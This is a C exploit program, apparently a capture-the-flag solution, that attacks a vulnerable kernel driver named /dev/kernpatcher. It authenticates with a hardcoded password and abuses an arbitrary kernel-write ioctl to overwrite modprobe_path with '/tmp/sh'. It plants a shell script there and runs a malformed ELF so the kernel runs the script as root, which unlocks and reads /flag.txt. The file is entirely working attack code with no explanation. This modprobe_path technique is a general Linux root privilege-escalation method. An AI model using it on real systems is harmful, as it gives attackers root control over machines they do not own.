// gcc -static exploit.c -o exploit

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#define DEVICE "/dev/kernpatcher"
#define IOCTL_WRITE_KERNEL 0x1337
#define IOCTL_AUTH 0xbeef
#define MAX_PASS_LEN 32

int main(int argc, char ** argv, char **envp) {

    if (argc < 2) {
        printf("[-] No kernel base provided\n");
        exit(1);
    }

    char *endptr;
    unsigned long kernel_base = strtoull(argv[1], &endptr, 16);

    if (!kernel_base) {
        fprintf(stderr, "[-] Bad kernel base.\n");
    }

    int fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("[-] Unable to open /dev/kernpatcher");
        exit(1);
    }

    // Auth
    char * pass = "Password2025";

    struct auth {
        uint32_t len;
        char data[MAX_PASS_LEN];
    } a;

    a.len = strlen(pass);
    strcpy(a.data, pass);
    int ret = ioctl(fd, IOCTL_AUTH, &a);
    if (ret < 0) {
        perror("[-] Unable to authenticate");
        exit(1);
    }
    printf("[+] Auth completed\n");

    // Get modprobe path addr using kernel base
    unsigned long modprobe_path = 0x1a5fbc0 + kernel_base; // offset, calc manually
    printf("[+] modprobe_path = 0x%lx\n", modprobe_path);

    // Overwrite modprobe path
    struct payload {
        unsigned long addr, val;
    } p;
    p.addr = modprobe_path;
    p.val = 0x0068732f706d742f; // "/tmp/sh" in little-endian (8 bytes)
    ret = ioctl(fd, IOCTL_WRITE_KERNEL, &p);
    if (ret < 0) {
        perror("[-] Unable to write to kernel");
        exit(1);
    }
    close(fd);

    // Set payload
    printf("[+] Setting payload\n");
    char payload[] = "#!/bin/sh\nchmod 666 /flag.txt\n";
    int fd_scr = open("/tmp/sh", O_WRONLY | O_CREAT, 0755);
    write(fd_scr, payload, sizeof(payload)-1);
    close(fd_scr);

    printf("[+] Triggering modprobe...\n");
    // Execute bad elf
    char badelf[] = "\x7f\x45LF\x02\x01\x01";
    int fd_elf = open("/tmp/badelf", O_WRONLY | O_CREAT, 0755);
    write(fd_elf, badelf, sizeof(badelf)-1);
    close(fd_elf);
    system("/tmp/badelf");

    char flag[64];
    int fd_flag = open("/flag.txt", O_RDONLY );
    if (fd_flag < 0) {
        perror("[-] Unable to read flag");
        exit(1);
    }
    read(fd_flag, flag, 64);
    close(fd_flag);

    puts(flag);

    return 0;
}
